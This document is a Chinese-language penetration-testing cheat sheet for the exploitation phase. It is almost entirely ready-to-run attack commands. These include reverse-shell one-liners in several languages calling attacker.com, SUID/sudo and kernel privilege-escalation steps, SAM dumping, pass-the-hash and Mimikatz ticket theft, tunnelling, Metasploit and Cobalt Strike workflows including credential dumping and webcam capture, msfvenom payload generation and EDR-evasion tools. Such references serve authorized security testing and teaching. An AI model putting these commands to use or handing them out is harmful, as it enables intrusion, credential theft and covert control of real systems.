# Phase 5: 漏洞利用

> **PTES 对应阶段**: 利用 (Exploitation)
> > **MITRE ATT&CK**: Initial Access [TA0001], Execution [TA0002], Privilege Escalation [TA0004]

## 初始访问获取

### 反向 Shell 速查

**攻击机监听**
```bash
# 基础监听
nc -lvnp 4444

# 升级TTY (使用socat)
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**目标机连接**
```bash
# Bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# Perl
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat (传统)
nc -e /bin/sh attacker.com 4444

# Netcat (无 -e 参数)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

**TTY升级技巧**
```bash
# 在目标shell中执行
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z 挂起
stty raw -echo; fg
# 输入: reset
export SHELL=bash
export TERM=xterm-256color
stty rows 38 columns 116
```

## 权限提升 (Privilege Escalation)

### Linux 本地提权

**信息收集脚本**
```bash
# 自动化枚举
# LinPEAS (推荐)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t -k password

# Linux Smart Enumeration
./lse.sh -l2
```

**手动检查清单**
```bash
# 系统信息
uname -a
cat /etc/os-release
cat /proc/version

# 用户权限
id
whoami
groups
sudo -l  # 检查sudo权限

# SUID文件
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 计划任务
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/*

# 可写文件/目录
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null

# 内核漏洞
uname -r
# 搜索: https://www.exploit-db.com/
```

**常见提权向量**

*1. SUID滥用 (GTFOBins)*
```bash
# 查找: https://gtfobins.github.io/
/usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/nano  # Ctrl+R Ctrl+X 输入命令
/usr/bin/vim -c ':!/bin/sh'
/usr/bin/less /etc/passwd
!/bin/sh
```

*2. Sudo滥用*
```bash
# 查看允许的命令
sudo -l

# 常见绕过 (参见GTFOBins)
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh";'
```

*3. 内核漏洞*
```bash
# DirtyCow (CVE-2016-5195)
# 影响: Linux kernel > 2.6.22
gcc -pthread dirtycow.c -o dirtycow -lcrypt
./dirtycow

# CVE-2021-4034 (PwnKit)
# 影响: pkexec版本 < 0.120
./cve-2021-4034
```

### Windows 本地提权

**信息收集**
```powershell
# 系统信息
systeminfo
whoami /priv
whoami /groups

# 自动化工具
# WinPEAS
winPEASx64.exe

# PowerUp
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1'); Invoke-AllChecks"
```

**常见提权向量**

*1. 令牌权限*
```powershell
# SeImpersonatePrivilege → JuicyPotato
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"

# SeBackupPrivilege → 读取SAM
reg save hklm\sam c:\temp\sam
reg save hklm\system c:\temp\system
```

*2. 服务权限*
```powershell
# 检查可写服务路径
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v '"'

# 检查服务权限
accesschk.exe -uwcqv "Authenticated Users" *

# 未引号的服务路径
# 创建C:\Program.exe
```

*3. 计划任务*
```powershell
schtasks /query /fo LIST /v
type C:\Windows\System32\Tasks\*
```

*4. AlwaysInstallElevated*
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
# 如果值为1，可安装MSI提权
```

## 横向移动

### Pass-the-Hash (PTH)

**Impacket套件**
```bash
# PSExec (类似于Sysinternals PsExec)
psexec.py -hashes LM:NT DOMAIN/admin@target.com

# WMIExec (更隐蔽)
wmiexec.py -hashes LM:NT DOMAIN/admin@target.com

# SMBExec
smbexec.py -hashes LM:NT DOMAIN/admin@target.com

# AtExec (计划任务)
atexec.py -hashes LM:NT DOMAIN/admin@target.com command
```

### Pass-the-Ticket (PTT)

**Mimikatz**
```
# 导出票据
sekurlsa::tickets /export

# 导入票据
kerberos::ptt ticket.kirbi

# 查看当前票据
kerberos::list
```

**Kekeo**
```
# 请求TGT
tgt::ask /user:admin /domain:target.com /ntlm:hash

# 请求TGS
tgs::s4u /tgt:tgt.kirbi /user:admin@target.com /service:cifs/target.com
```

### 网络发现

```bash
# 发现存活主机
nmap -sn 192.168.10.0/24

# 端口扫描 (通过代理)
proxychains nmap -sT -Pn 192.168.10.0/24

# 使用Meterpreter路由
meterpreter > run autoroute -s 192.168.10.0/24
```

## 隧道技术

### SSH隧道

```bash
# 本地转发 (-L)
ssh -L 8080:internal.target.com:80 user@jump.host
# 访问 localhost:8080 → 转发到 internal.target.com:80

# 远程转发 (-R)
ssh -R 4444:localhost:4444 user@vps.com
# VPS:4444 → 转发到 攻击机:4444

# 动态代理 (SOCKS)
ssh -D 1080 user@jump.host
proxychains nmap -sT target.com
```

### 工具隧道

**Chisel**
```bash
# 服务端
chisel server -p 8080 --reverse

# 客户端 (反向socks5)
chisel client http://server:8080 R:socks

# 使用
vim /etc/proxychains.conf
# socks5 127.0.0.1 1080
proxychains curl http://internal.target.com
```

**Ligolo-ng**
```bash
# 服务端
./ligolo-proxy -selfcert

# 客户端 (目标)
./ligolo-agent -connect attacker.com:11601 -ignore-cert

# 创建隧道
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
session    # 选择会话
ifconfig   # 显示网络接口
start      # 启动隧道
```

**Plink (Windows)**
```cmd
plink.exe -l root -pw password attacker.com -R 4444:localhost:4444
```

## 漏洞利用框架

### Metasploit

```bash
# 启动
msfconsole -q

# 工作流
search type:exploit name:ms17_010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS target.com
set LHOST attacker.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Meterpreter命令
getuid           # 当前用户
ps               # 进程列表
migrate PID      # 进程迁移
hashdump         # 获取哈希
load kiwi        # 加载Mimikatz
creds_all        # 获取凭证
screenshot       # 屏幕截图
webcam_snap      # 摄像头截图
shell            # 系统shell
```

### Cobalt Strike

```
# 基本工作流
# 1. 创建Listener (Beacon HTTP/HTTPS/DNS)
# 2. 生成Payload (HTML Application, Office Macro, etc.)
# 3. 投递Payload
# 4. Beacon上线

# 常用命令
sleep 0              # 交互模式
getuid
ps
inject PID x64       # 进程注入
powershell command   # 执行PowerShell
shspawn x64          # 生成新会话
psexec target        # 横向移动
```

## Payload生成

### MSFvenom

```bash
# Linux x64反向shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f elf -o shell.elf

# Windows x64反向shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f exe -o shell.exe

# Windows加密Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -e x64/xor_dynamic -i 10 -f exe -o meterpreter.exe

# Web Payloads
msfvenom -p php/reverse_php LHOST=attacker.com LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f war -o shell.war
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f asp -o shell.asp

# 各种格式
# exe, elf, dll, war, jsp, asp, aspx, raw, c, python, ruby, powershell
```

## 免杀技术 (Evasion)

### 基础混淆

```bash
# Base64编码
echo -n 'payload' | base64

# 字符串拼接 (PowerShell)
$cmd = 'pow' + 'ersh' + 'ell'

# 内存执行
# 将shellcode加载到内存执行，不落地磁盘
```

### 工具

```bash
# Veil
veil
use Evasion
list
use python/meterpreter/rev_tcp.py

# Sliver
sliver-server
new-operator --name attacker --lhost attacker.com

# Donut (将.NET程序集转shellcode)
donut -f payload.exe -o payload.bin

# ScareCrow (绕过EDR)
ScareCrow -I shellcode.bin -domain microsoft.com
```

## 参考资源

- [GTFOBins](https://gtfobins.github.io/) - Unix二进制文件提权
- [LOLBAS](https://lolbas-project.github.io/) - Windows二进制文件利用
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
